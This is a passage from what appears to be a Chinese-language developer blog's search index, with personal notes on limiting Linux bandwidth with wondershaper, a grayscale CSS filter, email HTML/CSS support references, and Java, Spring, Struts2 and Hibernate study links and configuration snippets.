限制網路速度方法","url":"%2Fblog%2F2020%2F04%2F05%2FLinux-%E9%99%90%E5%88%B6%E7%B6%B2%E8%B7%AF%E9%80%9F%E5%BA%A6%E6%96%B9%E6%B3%95%2F","content":"\n最近發現動物機上傳速度高的話\n容易造成別台機器網頁不能看(timeout)\n原本想用中華電信小烏龜設定Qos\n但好像沒有效果\n網路上有看到 Linux 控制連線速度\n\n<!--more-->\n\n## wondershaper\n\n```bash\n# 以下不能做，不要執行\nsudo apt install wondershaper\n\n# 使用 apt 安裝執行會出現\n# Please read the man page for the wondershaper and\n# the file /usr/share/doc/wondershaper/README.Debian.gz\n\n```\n\n> ...but as of Ubuntu 18.04LTS, the packaged wondershaper does not work correctly out of the box so you have to go direct to the github repo from magnific0\n\n好像...，apt 裝完不能用\n\n```bash\nwget https://github.com/magnific0/wondershaper/archive/master.zip -c -O wondershaper-tmp.zip && unzip -o wondershaper-tmp.zip && rm wondershaper-tmp.zip && cd wondershaper-master && sudo make install ; cd .. && rm -rf wondershaper-master\n```\n\n其實這些指令是抓檔案下來、解壓縮、刪除壓縮檔進去目錄，安裝程式完便刪除。\n\n參考:[Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen](https://magiclen.org/linux-bandwidth-limit/)\n\n### 如何移除\n\n因為使用 make install 安裝\n所以不知道怎麼移除\n到 wondershaper-master 做 `sudo make uninstall`\n\n[If I build a package from source how can I uninstall or remove completely? - Ask Ubuntu](https://askubuntu.com/questions/87111/if-i-build-a-package-from-source-how-can-i-uninstall-or-remove-completely)\n\n```\npi@raspberrypi:~/wondershaper-master $ sudo make uninstall\nrm -f /usr/sbin/wondershaper;\nrm -f /usr/lib/systemd/system/wondershaper.service;\nrm -f /etc/conf.d/wondershaper.conf;\n```\n\n### 使用方法\n\n```\nMODES:\n   wondershaper -a <adapter> -d <rate> -u <rate>\n   wondershaper -c -a <adapter>\n   wondershaper -s -a <adapter>\n\nEXAMPLES:\n   wondershaper -a eth0 -d 1024 -u 512\n   wondershaper -a eth0 -u 512\n   wondershaper -c -a eth0\n```\n\n記得輸入過的 wondershaper 的 interface 要重設速度\n要做 `wondershaper -c -a <interface>`\n\n## 算傳輸速度\n\n[Convert Kbps to megabyte/second - Conversion of Measurement Units](https://www.convertunits.com/from/Kbps/to/megabyte/second)\n\nEX 限制 2mb 換算 Kbps 16000\n公式:大概 1mb = 8000kbps\n但我應該是記不住，靠電腦算就好了XD\n\n\n\n### 設定服務\n\n重開機就會清除之前設定\n他其實你打的指令也不會記錄\n主要會吃/etc/systemd/wondershaper.conf\n所以要改在這裏面\n\n```bash\n# 啟用 service\nsudo systemctl enable wondershaper.service\n# 停用 service\nsudo systemctl disable wondershaper.service\n```\n\n奇怪，那我要設定多個 interface 要怎麼辦\n我後來查都查不到\n看到[Traffic management with WonderShaper [Documentation - Online.net]](https://documentation.online.net/en/dedicated-server/tutorials/network/configure-wondershaper)\n\n/usr/lib/systemd/system/wondershaper.service\n\n```\n[Unit]\nDescription=Bandwidth shaper/Network rate limiter\nAfter=network.target\nWants=network.target\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\nEnvironmentFile=/etc/systemd/wondershaper.conf\nExecStart=/usr/bin/wondershaper -a $IFACE -d $DSPEED -u $USPEED\nExecStop=/usr/bin/wondershaper -c -a $IFACE\n\n[Install]\nWantedBy=multi-user.target\n```\n\n其實看 ExecStart ，只會幫你帶入一個\n感覺能透過 EnvironmentFile 加參數\n透過 ExecStart 和 ExecStop 實現多個 interface 操作\n\n\n[linux服務器使用WonderShaper進行網絡速度限制 – WONGCW 網誌](https://blog.wongcw.com/2019/05/07/linux%E6%9C%8D%E5%8B%99%E5%99%A8%E4%BD%BF%E7%94%A8wondershaper%E9%80%B2%E8%A1%8C%E7%B6%B2%E7%B5%A1%E9%80%9F%E5%BA%A6%E9%99%90%E5%88%B6/)\n\n## Trickle\n\nTrickle 我就不研究了\n\n\n[【系統】Ubuntu : 限制網路頻寬 @ Ching Wei : This is My Life - 工作、攝影、旅遊 :: 痞客邦 ::](https://ching119.pixnet.net/blog/post/59675947)\n[Linux下使用Trickle限制下載上傳帶寬 - 每日頭條](https://kknews.cc/zh-tw/code/3494a8y.html)\n[Linux 如何使用wondershaper來限制網路頻寬？ | MagicLen](https://magiclen.org/linux-bandwidth-limit/)\n\n\n## iptable + tc\n\n感覺 wondershaper 是用 tc\n但我看不懂 tc 設定\n\n> wondershaper 是一個易用的流量限制腳本. 該腳本提供了以下改進:\n>    降低交互流量時的延遲時間\n>    允許上傳/下載的同時保留適當的 Web 瀏覽速度\n>    確保上傳不會影響到下載\n>    確保下載不會影響到上傳\n\n[Wondershaper流量監控工具 - Ubuntu中文](https://wiki.ubuntu.org.cn/Wondershaper%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7)\n\n[程式扎記: [Linux 文章收集] TC 入門 (traffic control)](http://puremonkey2010.blogspot.com/2015/01/linux-tc-traffic-control.html)\n[使用iptables和tc对端口限速 - 行木辛 - 博客园](https://www.cnblogs.com/xingmuxin/p/10793272.html)\n[关于 iptables 和 tc 的限速理解 - 线上猛如虎，线下怂如鼠（WhyNotBetter） - SegmentFault 思否](https://segmentfault.com/a/1190000000666869)\n[[Linux] TC(traffic control)流量控制實作筆記(1)](https://shofan.blogspot.com/2017/08/linux-tctraffic-control.html)\n[iptables 限速 - 哈希](https://www.haxi.cc/archives/iptables-%E9%99%90%E9%80%9F.html)\n\n\n## 其他工具\n\n爬到[linux的traffic control@小鸟技术笔记](https://www.lijiaocn.com/%E6%8A%80%E5%B7%A7/2017/08/10/linux-net-traffic-control.html#trickle)有很多工具\n\ndummynet\n> dummynet通過創建pipe接管指定的報文，對其進行整型。\n\n[利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客](https://blog.csdn.net/baidu_zhongce/article/details/46874583)\n其他惡劣環境方法:\n* [模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园](https://www.cnblogs.com/jinjiangongzuoshi/p/5272787.html)\n* [如何模拟弱网测试 - 尚码园](https://www.shangmayuan.com/a/0fd3247055c54298b214d92c.html)\n* [Linux模拟复杂网络环境下的传输（netem和tc） - 哈希](http://www.haxi.cc/archives/Linux%E6%A8%A1%E6%8B%9F%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E4%BC%A0%E8%BE%93-netem%E5%92%8Ctc.html)\n\n之前有在想要怎麼創造很糟網路環境，剛好看到這篇\n\npyshaper\n\n> pyshaper是一個帶有gui的限速工具。","tags":["限速"],"categories":["Linux"]},{"title":"網站哀弔灰階 CSS 方法","url":"%2Fblog%2F2020%2F04%2F04%2F%E7%B6%B2%E7%AB%99%E5%93%80%E5%BC%94%E7%81%B0%E9%9A%8E-CSS-%E6%96%B9%E6%B3%95%2F","content":"\n單純紀錄\n\n<!--more-->\n\n```css\nfilter: grayscale(100%);\n```\n\nhtml body\n```html\n<!DOCTYPE html>\n<html style=\"filter: grayscale(100%);\">\n<head>\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width\">\n  <title>JS Bin</title>\n</head>\n<body>\n<div>\n  test\n  </div>\n</body>\n</html>\n```\n\n```css\nbody{\n  background: url('https://cache.cswsadlab.com/wp-content/uploads/2015/08/16_bg_noise_scale.jpg') no-repeat center center /cover;\n}\n```\n[哀悼日网站全站变灰CSS代码 - 严颖专栏 - SegmentFault 思否](https://segmentfault.com/a/1190000007781619)","tags":["css"],"categories":["CSS"]},{"title":"Email 支援 HTML 和 CSS 查詢方法","url":"%2Fblog%2F2020%2F04%2F02%2FEmail-%E6%94%AF%E6%8F%B4-HTML-%E5%92%8C-CSS-%E6%9F%A5%E8%A9%A2%E6%96%B9%E6%B3%95%2F","content":"\n最近接到簡單的任務\n修改 E-mail 排版\n就是縮排的問題\n但由於我對 Outlook 支援性不是很清楚\n一個一個試感覺不是很方便\n有找到幾個網址可以查\n\n<!--more-->\n\n## 查詢網站\n\n### HTML\n\n- [Email HTML tags & attributes ignored by Outlook](https://www.outlook-apps.com/html-ignored-by-outlook/)\n- [Can I email… Support tables for HTML and CSS in emails](https://www.caniemail.com/)\n\n### CSS\n\n- [CSS Support Guide for Email Clients [+Checklist] | Campaign Monitor](https://www.campaignmonitor.com/css/text-fonts/svg/)\n- [Email Client CSS Support | Email Design Reference](https://templates.mailchimp.com/resources/email-client-css-support/)\n\n### 其他\n\n神奇的樣版引擎套 email 的 html + css\n[MJML - The Responsive Email Framework](https://mjml.io/)\n\n## 處理空白問題\n\n不知道再存文字寄送的時候，Outlook 收信時候不會轉空白字元\n我在程式外面加 pre html tag就能看到縮排\n\n另外一種方式全部轉成 HTML\n\n[【译】使用 <pre> 标签样式的注意事项 - 奇舞团博客](https://75.team/post/considerations-for-styling-the-%3C-pre-%3E-tag.html)\n[vb6 - HTML blank spaces in email - Stack Overflow](https://stackoverflow.com/questions/11429772/html-blank-spaces-in-email)\n\n改變 ol li 寫法\n[html - Can ordered list produce result that looks like 1.1, 1.2, 1.3 (instead of just 1, 2, 3, ...) with css? - Stack Overflow](https://stackoverflow.com/questions/4098195/can-ordered-list-produce-result-that-looks-like-1-1-1-2-1-3-instead-of-just-1)","tags":["html"],"categories":["HTML"]},{"title":"Java 雜記","url":"%2Fblog%2F2020%2F03%2F28%2FJava-%E9%9B%9C%E8%A8%98%2F","content":"\nTODO: 尚未整理完成\n\n<!--more-->\n\n[The 2020 Java Developer RoadMap](https://javarevisited.blogspot.com/2019/10/the-java-developer-roadmap.html)\n\n[Top 20 Libraries and APIs Java Developer should know](https://javarevisited.blogspot.com/2018/01/top-20-libraries-and-apis-for-java-programmers.html)\n\n## Exception \n[Java筆記 — Exception 與 Error - Carl - Medium](https://medium.com/@clu1022/java%E7%AD%86%E8%A8%98-exception-%E8%88%87-error-dbdf9a9b0909)\n\n## io close\n[Java：浅谈InputStream的close方法 - 白羊沈歌 - 博客园](https://www.cnblogs.com/shenpengyan/p/6117814.html)\n[Java OutputStream.close()关闭并释放输出流资源](http://www.51gjie.com/java/701.html)\n\n[Snailclimb/JavaGuide: 【Java学习+面试指南】 一份涵盖大部分Java程序员所需要掌握的核心知识。](https://github.com/Snailclimb/JavaGuide#mybatis)\n\n### Memory-mapped File\n[Java中Stream和Memory-mapped File的I/O性能对比 - Xavier's Blog](http://quxiao.github.io/blog/2011/03/31/java-memory-mapped-file-stream-and-the-i-o-performance-comparison/)\n\n### stack /heap 記憶體相關\n\n[(1) Java技術與認證交流平台](https://www.facebook.com/groups/748837991920629/permalink/1658181240986295/)\n\n## Java Web\n\n### Session\n- [JSP Session | 菜鸟教程](https://www.runoob.com/jsp/jsp-session.html)\n每一個 war 檔 session 都是分開的，可用上面 JSP 測試\n\n- [L316476844/distributed-session: 集群/分布式环境Session的几种策略 实现步骤和方式 1、粘性session 2、应用服务器间的session复制共享 3、基于cache DB缓存的session共享](https://github.com/L316476844/distributed-session)\n\n- [跨war包session同步_数据库_阳光下的立人-CSDN博客](https://blog.csdn.net/sun305355024sun/article/details/6928370)\n\n## spring core\n\n[介绍 | 走心的Java Web入门开发教程](https://www.ctolib.com/docs/sfile/Heart-First-JavaWeb/index.html)\n[開源框架: Spring Gossip](https://openhome.cc/Gossip/SpringGossip/index.html)\n[ApplicationContext 与 BeanFactory 区别 - 掘金](https://juejin.im/post/5b77d33151882542d23a0823)\n[Spring Container | securenai SITE](https://securenai.github.io/spring/spring_page2/) {% asset_link web1.png 備份圖 %}\n\n[Spring第一篇【介绍Spring、引入Spring、Spring六大模块】 - 掘金](https://juejin.im/post/5a6476cdf265da3e243b9e61)\n\n[什么是面向切面编程AOP？ - 知乎](https://www.zhihu.com/question/24863332)\n\n[Spring|@Autowired与new的区别 - 无聊的三文鸡 - 博客园](https://www.cnblogs.com/maikucha/p/10145169.html)\n\nautowired 動態\n\n[java - how to use '@Qualifier' dynamically specifying parameters? - Stack Overflow](https://stackoverflow.com/questions/54193516/how-to-use-qualifier-dynamically-specifying-parameters)\n[spring - 如何使用运行时“限定符”变量动态注入服务？ - IT工具网](https://www.coder.work/article/56406)\n\nautowired 常見錯誤\n[Autowired · Brian的雜記](https://wujincheng.gitbooks.io/brian/java/spring/autowired.html)\n\n[@Autowired和static的关系 - 左手程序，右手诗 - 博客园](https://www.cnblogs.com/pangyangqi/p/10010866.html)\n## Class\n\ncom.google.gson.annotations.Expose\nGSON\n[《Android》『JSON & GSON』- GSON 的基本程式語法教學 (下) - 賽肥膩膩の食旅生活誌](https://xnfood.com.tw/android-json-gson-2/)\n\nJAVA IO\n[無邊界的想像力: Java SE 入門教學 - IO 流](https://ethan-imagination.blogspot.com/2018/12/javase-gettingstarted-019.html)\n[java读取文件API速度对比_Java_fengxingzhe001的专栏-CSDN博客](https://blog.csdn.net/fengxingzhe001/article/details/67640083)\n[Java讀取寫出檔案FileReader和FileWriter | CYL菜鳥攻略 - 點部落](https://dotblogs.com.tw/cylcode/2018/09/21/170510)\n\njava.io.BufferedWriter\njava.io.ByteArrayOutputStream\njava.io.FileInputStream\njava.io.FileOutputStream\njava.io.IOException\njava.io.PrintWriter\njava.io.Serializable\njava.io.Writer\njava.io.File\n\n要曲檔名 file.getName\n路徑 file.getPath 會包含檔名\n\n要怎麼曲資料夾路徑\n[java - How do I get a file's directory using the File object? - Stack Overflow](https://stackoverflow.com/questions/3657157/how-do-i-get-a-files-directory-using-the-file-object)\n\n\n\nFile.getParent()  可能會抓到 null\n```java\nFile file = new File(\"test.txt\");\nString parent = file.getParent();\n```\n所以推薦\n\n```java\nparent = file.getAbsoluteFile().getParent();\n```\n\nPath\n\n[Java NIO之擁抱Path和Files | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/282/)\n\n```java\nFile file = new File(\"C:/my.ini\");\nPath p1 = file.toPath();\np1.toFile();\nfile.toURI();\n```\n\nMATH\njava.math.BigDecimal\n\nip\njava.net.InetAddress\n\n[InetAddress (Java Platform SE 7 )](https://docs.oracle.com/javase/7/docs/api/java/net/InetAddress.html)\n[InetAddress 類別](https://openhome.cc/Gossip/JavaGossip-V2/InetAddress.htm)\n[利用Java獲得IP地址 @ Java 咖啡 :: 隨意窩 Xuite日誌](https://blog.xuite.net/x_3kkk/java/13809146-%E5%88%A9%E7%94%A8Java%E7%8D%B2%E5%BE%97IP%E5%9C%B0%E5%9D%80)\n\n處理時間格式\njava.text.SimpleDateFormat\n[Java：日期時間格式化輸出入處理：Date、Calendar、SimpleDateFormat @ 符碼記憶](https://www.ewdna.com/2009/01/javadatecalendardateformatsimpledatefor.html)\n\n\njava.util\nContains the collections framework, legacy collection classes, event model, date and time facilities, internationalization, and miscellaneous utility classes (a string tokenizer, a random-number generator, and a bit array).\n\njava.util.ArrayList\njava.util.Calendar\njava.util.Collections\njava.util.Date\njava.util.HashMap\njava.util.HashSet\njava.util.LinkedHashMap\njava.util.List\njava.util.Map\njava.util.Set\njava.util.UUID\n\n\njavax.crypto.IllegalBlockSizeException\n[JAVA实现AES加密-云栖社区-阿里云](https://yq.aliyun.com/articles/533581)\n\njavax.persistence\nJava Persistence is the API for the management for persistence and object/relational mapping.\n\njavax.persistence.Column\njavax.persistence.Entity\njavax.persistence.FetchType\njavax.persistence.GeneratedValue\njavax.persistence.GenerationType\njavax.persistence.Id\njavax.persistence.JoinColumn\njavax.persistence.ManyToOne\njavax.persistence.SequenceGenerator\njavax.persistence.Table\njavax.persistence.Temporal\njavax.persistence.TemporalType\n\n\njavax.servlet.http.HttpServletRequest\njavax.servlet.http.HttpServletResponse\n\n\nnet.sf.json.JSONObject\n[JSON用法—net.sf.json.JSONObject_Java_午夜阳光-CSDN博客](https://blog.csdn.net/u013514928/article/details/79114814)\n\norg.apache.commons.io.FileUtils\n[org.apache.commons.io.FileUtils 详解_Java_蚩尤后裔-CSDN博客](https://blog.csdn.net/wangmx1993328/article/details/80136921)\n[Apache Commons工具集简介 - 坚持学习 - ITeye博客](https://www.iteye.com/blog/zhoualine-1770014)\n\norg.apache.commons.lang.builder.ToStringBuilder\norg.apache.commons.lang.builder.ToStringStyle\norg.apache.commons.lang.StringUtils\n[Commons Lang使用ToStringBuilder - 就是愛Java](http://java.openyu.org/2014/03/commons-lang3-tostringbuilder_18.html)\n[[Java基础]StringUtils.join()方法与String.join()方法的使用_Java_YuanMxy'Home-CSDN博客](https://blog.csdn.net/YuanMxy/article/details/81012697)\n\norg.apache.commons.io.IOUtils\n[java - Should I close the InputStream of org.apache.commons.io.IOUtils - Stack Overflow](https://stackoverflow.com/questions/36861650/should-i-close-the-inputstream-of-org-apache-commons-io-ioutils)\n\n[Javalogy–Java的學習筆記: Commons Logging](http://java-logy.blogspot.com/2007/11/commons-logging.html)\norg.apache.commons.logging.Log\norg.apache.commons.logging.LogFactory\norg.apache.log4j.Logger\n\n[Apache POI超鏈接 - POI基礎教程](http://tw.gitbook.net/apache_poi/apache_poi_hyperlink.html)\norg.apache.poi.ss.usermodel.Row\norg.apache.poi.xssf.usermodel.XSSFRow\norg.apache.poi.xssf.usermodel.XSSFSheet\norg.apache.poi.xssf.usermodel.XSSFWorkbook\n\n\norg.hibernate.Query\n[第二個 Hibernate](https://openhome.cc/Gossip/HibernateGossip/SecondHibernate.html)\n\n\norg.junit.runner.RunWith\norg.junit.Test\n[JUnit 5和JUnit 4比较_Java_javaZhong的博客-CSDN博客](https://blog.csdn.net/u010675669/article/details/86574956)\n[使用 JUnit 4.x](https://openhome.cc/Gossip/JUnit/JUnit4.html)\n\norg.springframework.beans.BeanUtils\n[Spring 中的BeanUtils与apache中的BeanUtils差别_Java_langqiao123的专栏-CSDN博客](https://blog.csdn.net/langqiao123/article/details/72961332)\n\norg.springframework.beans.factory.annotation.Autowired\n[IoC - Annotation (@Autowired) - 史帝芬心得筆記](https://sites.google.com/site/stevenattw/java/spring-framework/ioc---annotation-autowired)\n\norg.springframework.beans.factory.annotation.Qualifier\n[详解@Autowired、@Qualifier和@Required_Java_Benjamin-CSDN博客](https://blog.csdn.net/benjamin_whx/article/details/24659745)\n\norg.springframework.context.support.AbstractApplicationContext\norg.springframework.context.support.ClassPathXmlApplicationContext\n[Spring 入门学习二之IOC - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000015047555)\n\norg.springframework.stereotype.Repository\n\n\norg.springframework.stereotype.Service\n[SSM简单整合教程&测试事务 - 东北小狐狸 - 博客园](https://www.cnblogs.com/hellxz/p/7282454.html)\n[Day 8 Spring MVC-@Service的使用 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10194079)\n\norg.springframework.test.context.ContextConfiguration\n[Sprin g整合 JUnit4 测试时，使用 @ContextConfiguration 注解引入多个配置文件_Java_HeatDeath的博客-CSDN博客](https://blog.csdn.net/HeatDeath/article/details/79364562)\n\n\norg.springframework.test.context.junit4.SpringJUnit4ClassRunner\norg.springframework.transaction.annotation.Propagation\n[Spring中@Transactional用法詳細介紹 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/312313/)\n\norg.springframework.transaction.annotation.Transactional\n[框架源码系列十一：事务管理（Spring事务管理的特点、事务概念学习、Spring事务使用学习、Spring事务管理API学习、Spring事务源码学习） - 小不点啊 - 博客园](https://www.cnblogs.com/leeSmall/p/10306672.html)\n[透彻的掌握 Spring 中@transactional 的使用](https://www.ibm.com/developerworks/cn/java/j-master-spring-transactional-use/index.html)\n\norg.springframework.web.bind.ServletRequestUtils\n[Spring中好用的工具类 - 作业部落 Cmd Markdown 编辑阅读器](https://www.zybuluo.com/Cesar/note/393815)\n\n\nCalendar \n[為什麼不建議使用Date，而是使用Java8新的時間和日期API？ - IT閱讀](https://www.itread01.com/content/1568272383.html)\n\n\n\n\n\n## Struts\n\n### 詳細教學\n\n[Struts2第二篇【开发步骤、执行流程、struts - 掘金](https://juejin.im/post/5a64772a6fb9a01cb31647e3)\n[Struts2第三篇【Action开发方式、通配符、Struts常量、跳转全局视图、action节点默认配置】 - 掘金](https://juejin.im/post/5a6476cc51882573392cd64b)\n[Spring第四篇【Intellij idea环境下、Struts2和Spring整合】 - 掘金](https://juejin.im/post/5a6476ed6fb9a01cbc6e7e44)\n[Struts2第五篇【类型转换器、全局、局部类型转换器】 - 掘金](https://juejin.im/post/5a64770ef265da3e54692b05)\n[Struts2第六篇【文件上传和下载】 - 掘金](https://juejin.im/post/5a6476e36fb9a01c975a58cf)\n[Struts2第七篇【介绍拦截器、自定义拦截器、执行流程、应用】 - 掘金](https://juejin.im/post/5a647729518825732d7fb34b)\n[Struts第八篇【资源国际化、对比JSP的资源国际化】 - 掘金](https://juejin.im/post/5a6476a6518825732b19f002)\n[Struts2第九篇【OGNL、valueStack详解】 - 掘金](https://juejin.im/post/5a64773d6fb9a01ca071ef96)\n[Struts2第十一篇【简单UI标签、数据回显】 - 掘金](https://juejin.im/post/5a6476f3f265da3e33046e47)\n[Struts2第十二篇【模型驱动】 - 掘金](https://juejin.im/post/5a6476cd518825732d7fb347)\n[Struts2第十三篇【防止表单重复提交拦截器】 - 掘金](https://juejin.im/post/5a6476ad51882573485a0d86)\n\n\n\n[Struts2入门这一篇就够了 - 掘金](https://juejin.im/post/5aa3349ff265da23884caa6a)\n\n[Struts2的配置 struts.xml Action詳解 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/303709/)\n\n### 數據封裝\n\nstruts2 最近使用發現他在表單傳送 input 值真的很方便\n只要對 Java 做 getXxxx , setXxxx (動態) 就能做很多設定\n後來查到這名詞是數據封裝\n有很多種方式很已做到\n詳細如:[struts2(二) 表单参数自动封装和参数类型自动转换 - 漂泊在外的程序员老王 - 博客园](https://www.cnblogs.com/whgk/p/6587130.html)\n\n\n[struts2转换器详解_Java_xtayfjpk的专栏-CSDN博客](https://blog.csdn.net/xtayfjpk/article/details/16826649)\n\n### struts.xml\n\n- [Struts2配置文件【代码库】 - 掘金](https://juejin.im/post/5a6476b1f265da3e55380273)\n- [7、struts.xml配置详解 - 暗夜亡灵 - 博客园](https://www.cnblogs.com/fmricky/archive/2010/05/20/1740479.html)\n- [Struts 2 result详解 - 簡書](https://www.jianshu.com/p/d8ba3a768447)\n- [java - How to return HTTP error status code *and* content in Struts2 - Stack Overflow](https://stackoverflow.com/questions/5904821/how-to-return-http-error-status-code-and-content-in-struts2)(未測試)\n- [菜鸟学Struts2——Results - 92年程序员 - 博客园](https://www.cnblogs.com/niloay/p/struts2-result.html)\n- \n\n#### 最佳程式路徑\n\n曾經第一次接觸使用 strut2\n我常用 XML 設定如下\n\n```xml\n<package name=\"vvvv\" namespace=\"/vvvv\" extends=\"struts-default\">\n    <action name=\"insertStock\" method=\"doInsertStock\" class=\"vvvv.action.Stock\">\n        <result name=\"success\">/vvvv/pages/stock_update.jsp</result>\n        <result name=\"error\">/vvvv/pages/stock_insert.jsp</result>\n    </action>\n    <action name=\"addStock\" method=\"doAddStock\" class=\"vvvv.action.Stock\">\n        <result name=\"success\">/vvvv/pages/stock_insert.jsp</result>\n    </action>\n...\n```\n\n通常一個 class 跟 method 對應一個設定\n但我發現 xml 的 action method 設定不一定要放(預設是 execute)\n每一個 method 不一定需要設定 不一定要放多個 tag 如範例\n只要設定一個 action 就能做到了\n可參考下面設定\n\n```xml\n<action name=\"oooo\" class=\"com.oooo.action.XxxxAction\">\n    <result name=\"success\">/ooooo/oooo/success.jsp</result>\n    <result name=\"list\">/ooooo/oooo/query.jsp</result>\n    <result name=\"edit\">/ooooo/oooo/edit.jsp</result>\n</action> \n```\n\n其他，看到優良設定\n```xml\n<package name=\"user\" namespace=\"/\" extends=\"struts-default\"> \n<action name=\"*user\" class=\"com.zzjmay.action.VaildateAction\" method=\"{1}\"> \n<result name=\"success\">/success.jsp</result> \n<result name=\"input\">/{1}.jsp</result> \n</action> \n</package> \n```\n> 1. name:邏輯上的包名\n> 2. namespace:名稱空間，用來區分同意struts下的相同action（注意是一種邏輯上的的路徑）\n> 3. extends: 繼承某個配置檔案\n> 4. abstract\n> 1. name:Action類的對映名稱\n> 2. class:Action類的完整路徑\n> 3. method:預設使用的execute()方法，如果要自定義觸發方法，需要使用method自定義\n\n[Struts2的配置 struts.xml Action詳解 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/303709/)\n\n還有更彈性設定\n\n```xml\n    <action name=\"user_*_*\" method=\"user{2}\" class=\"com.gopain.{1}\">\n    <result name=\"type_{2}\">/{2}_page.jsp</result>\n    </action>\n```\n> 假如請求為，user_UserAction_login（不考慮namespace），其中 action中{1} 為UserAction，{2}為login，此請求會執行com.gopain.UserAction$userlogin().如果返回值為」type_login「,則會跳轉到login_page.jsp頁面。\n> \n> 此處只是舉例，站點不宜這樣配置請求。但是對於action的name配置很實用，不要奢望一個action配置完整個站點（雖然也可以實現，而且對於訪問沒有太多影響），十分不利於管理。\n> ————————————————\n> 版权声明：本文为CSDN博主「gopain」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/gopain/java/article/details/40790523\n\n參考:[[Struts2] 配置文件struts.xml和web.xml詳解_網絡_gopain-CSDN博客](https://blog.csdn.net/gopain/article/details/40790523)\n\n管理上還請斟酌，不過用第二個方法就很方便了\n\n### 與 spring 設定\n\n[struts2默认拦截器之autowiring_Java_shendeguang的专栏-CSDN博客](https://blog.csdn.net/shendeguang/article/details/8194871)\n\n### action 到 jsp 傳值\n\n[struts2中action传值到jsp页面的3种方法 - 开源中国首席吊炸天的个人空间 - OSCHINA](https://my.oschina.net/u/3058325/blog/804000)\n\n## struts2 錯誤處理\n[起風前的相遇: Struts2 處理404錯誤的方法](http://mactruecolor.blogspot.com/2011/07/struts2-404.html)\n\n### 攔截器\n\n- [Struts2【拦截器】就是这么简单 - 知乎](https://zhuanlan.zhihu.com/p/34433146)\n`<interceptor-stack name=\"defaultStack\">` 宣告攔截器...\n\n#### JSON 設定\n\n```xml\n  <package name=\"default\" namespace=\"/\" extends=\"json-default\">\n\t\t<global-results>\n\t\t\t<result name=\"dataResult\" type=\"json\">\n\t\t\t\t<!-- <param name=\"root\">jsonresult_var</param> 針對 action 的 變數當 json 的 root\n\t\t\t\t<param name=\"contentType\">text/json</param>  --> \n\t\t\t</result>\n            ....\n```\n\n參考:[Struts2和JSON實例 - Struts2教學](http://tw.gitbook.net/struts_2/struts-2-and-json-example.html)\n\n更多設定可參考\n[JSON plugin](https://struts.apache.org/plugins/json/)\n\n#### 下載檔案\n\n```xml\n\t\t\t<result name=\"download\" type=\"stream\">\n\t\t\t\t<param name=\"contentType\">application/octet-stream</param>\n\t\t\t\t<param name=\"inputName\">fileStream</param>\n\t\t\t\t<param name=\"contentDisposition\">attachment;filename=\"${fileName}\"</param>\n\t\t\t\t<param name=\"bufferSize\">1024</param>\n\t  \t\t</result>\n```\n\n> 在上述配置代碼中，分別通過 stream 結果類型的屬性設置了所要下載文件的類型、名稱和輸入流。其中 ${filename} 表示在項目運行時，將 action 中的 filename 屬性動態地填充在 ${} 中間部分，這樣就可以動態地獲取所要下載的文件名稱。\n\n通常上述關係，會做 setFileName(xxx)\n\n參考:[Struts2文件下载实例](http://c.biancheng.net/view/4160.html)\n\n\n#### 移除 url .action\n\n在 struts.xml 加入 tag 可以解決這個問題\n```xml\n<struts>\n    <constant name=\"struts.action.extension\" value=\"\"/> \n</struts>\n```\n不過我發現預設是 ,,action ，代表.action 跟空白也可以使用\n上述詳細教學第三章有提到\n\n[java - Struts 2 - Removing action from url - Stack Overflow](https://stackoverflow.com/questions/17160838/struts-2-removing-action-from-url)\n[如何刪除Struts2動作的後綴擴展名 - Struts2教學](http://tw.gitbook.net/struts_2/how-to-remove-the-action-suffix-extension-in-struts-2.html)\n\n\n## Hibernate\n\n[Hibernate第一篇【介绍Hibernate，简述ORM，快速入门】 - 掘金](https://juejin.im/post/5a64773ef265da3e2b168426)\n[Hibernate第二篇【API讲解、执行流程图】 - 掘金](https://juejin.im/post/5a6477186fb9a01ca10b02a4)\n[Hibernate第三篇【主配置文件、映射文件、复合主键映射】 - 掘金](https://juejin.im/post/5a64771ef265da3e2a0db002)\n[Hibernate第五篇【inverse、cascade属性详解】 - 掘金](https://juejin.im/post/5a6476ab6fb9a01c95263107)\n[Hibernate第六篇【多对多映射、一对一映射】 - 掘金](https://juejin.im/post/5a6476c5f265da3e36415c2c)\n[Hibernate第七篇【对象状态、一级缓存】 - 掘金](https://juejin.im/post/5a64773a51882573336625f5)\n[Hibernate第八篇【懒加载】 - 掘金](https://juejin.im/post/5a6476ea51882573256be7ae)\n[Hibernate第九篇【组件映射、继承映射】 - 掘金](https://juejin.im/post/5a6477196fb9a01c96583d5a)\n[Hibernate第十篇【Hibernate查询详解、分页查询】 - 掘金](https://juejin.im/post/5a647712518825733c142733)\n[Hibernate第十一篇【配置C3P0数据库连接池、线程Session】 - 掘金](https://juejin.im/post/5a6476f1f265da3e5b32e632)\n[Hibernate第十二篇【二级缓存介绍、缓存策略、查询缓存、集合缓存】 - 掘金](https://juejin.im/post/5a6476a9f265da3e484beb53)\n\n### Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]\n[Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]_Java_鹏霄万里展雄飞-CSDN博客](https://blog.csdn.net/wangpeng047/article/details/12042051)\n\n### OpenSessionInViewFilter\n\n- [[转]Spring配置之OpenSessionInViewFilter - yunlvrensheng - 博客园](https://www.cnblogs.com/ZhuRenWang/p/4708973.html)\n- 